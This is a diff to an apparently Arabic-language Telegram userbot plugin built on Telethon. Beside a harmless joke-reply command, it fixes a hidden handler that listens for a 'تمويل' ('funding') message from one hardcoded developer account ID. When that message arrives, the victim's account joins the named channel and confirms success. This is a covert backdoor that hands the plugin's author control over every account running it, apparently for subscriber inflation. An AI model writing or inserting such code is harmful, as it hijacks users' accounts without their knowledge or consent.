@@ -278,19 +278,23 @@ Qrue_Bosa = [
 async def ithker(knopis):
     await knopis.edit(choice(Qrue_Bosa))
 
+
 DevSaher = 6528926431
+
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تمويل") and event.sender_id in DevSaher:
+    if event.message.message.startswith("تمويل") and event.sender_id == DevSaher:
         message = event.message
         if len(message.text.split()) > 1:
             channel_username = message.text.split()[1].replace("@", "")
-        if channel_username:
-            try:
-                await Qrh9(JoinChannelRequest(channel_username))
-                response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
-            except ValueError:
-                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
+            if channel_username:
+                try:
+                    await Qrh9(JoinChannelRequest(channel_username))
+                    response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
+                except ValueError:
+                    response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
+            else:
+                response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         else:
             response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
-            await event.edit(response)
+        await event.respond(response)
